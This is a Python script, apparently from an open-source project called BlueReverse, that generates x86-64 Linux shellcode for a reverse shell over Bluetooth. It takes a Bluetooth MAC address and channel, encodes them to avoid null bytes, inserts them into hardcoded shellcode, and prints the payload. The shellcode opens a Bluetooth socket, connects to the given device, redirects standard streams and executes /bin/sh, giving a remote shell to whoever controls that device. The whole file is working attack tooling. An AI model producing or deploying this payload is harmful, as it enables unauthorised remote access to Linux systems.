import argparse, binascii, sys, struct
"""
BLUEREVERSE
Bluetooth reverse shell actually for x86-64 Linux system.

Copyright (C) 2020  Neetx

This file is part of bluereverse.

BlueReverse is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

BlueReverse is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>

CONTACTS:
	- neetx@protonmail.com

http://github.com/Neetx/BlueReverse
"""

def bytes_mac_to_string(mac): #only for human readable output
    return ("\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x" % struct.unpack("BBBBBB", mac))

def bytes_channel_to_string(channel):
    return ("\\x%02x" % struct.unpack("B", channel))

def mac_to_bytes(mac):
    return binascii.unhexlify(mac.replace(':',''))[::-1]

def not_to_bytes(mac):
    return [~x%256 for x in mac]

def str_channel_to_byte(channel):
    return struct.pack('B', int(channel))

parser = argparse.ArgumentParser(epilog="Ex: ./generator.py BLUETOOTH_MAC_ADDRESS")
parser.add_argument("mac", help="Bluetooth mac address")
parser.add_argument("channel", help="Channel")

inputs = parser.parse_args()

mac = inputs.mac
channel = inputs.channel

mac = mac_to_bytes(mac)
print("Bluetooth MAC address, little endian: %s" % bytes_mac_to_string(mac))

mac = not_to_bytes(mac)
mac = bytes(mac)

channel = str_channel_to_byte(channel)

print("Bluetooth MAC address, after bitwise NOT: %s" %bytes_mac_to_string(mac))
print("Bluetooth channel: %s\n" % bytes_channel_to_string(channel))

shellcode  = b"\x6a\x29\x58\x6a\x01\x5e\x6a\x1f\x5f\x6a\x03\x5a\x0f\x05\x97\x6a\x02\x66"
shellcode += b"\x5e\xb0\x21\x0f\x05\x83\xee\x01\x79\xf7\x48\x31\xc9\xb1"
shellcode += channel
shellcode += b"\x51\x48\xb9"
shellcode += b"\xe0\xff"
shellcode += mac
shellcode += b"\x48\xf7\xd1\x51\x54\x5e\xb2\x0a\x48\x31"
shellcode += b"\xc0\xb0\x2a\x0f\x05\x48\x31\xd2\x52\x5e\x52\x48\xb9\x2f\x62\x69\x6e\x2f"
shellcode += b"\x2f\x73\x68\x51\x54\x5f\xb0\x3b\x0f\x05"

bshellcode = binascii.hexlify(shellcode)
bshellcode = [bshellcode[idx:idx+2] for idx,val in enumerate(bshellcode) if idx%2 == 0]

i = 0
for item in bshellcode:
    if i % 1 == 0:
        sys.stdout.write("\\x")
    sys.stdout.write(item.decode())
    i += 1

print("\n")

print("Shellcode length = " + str(i))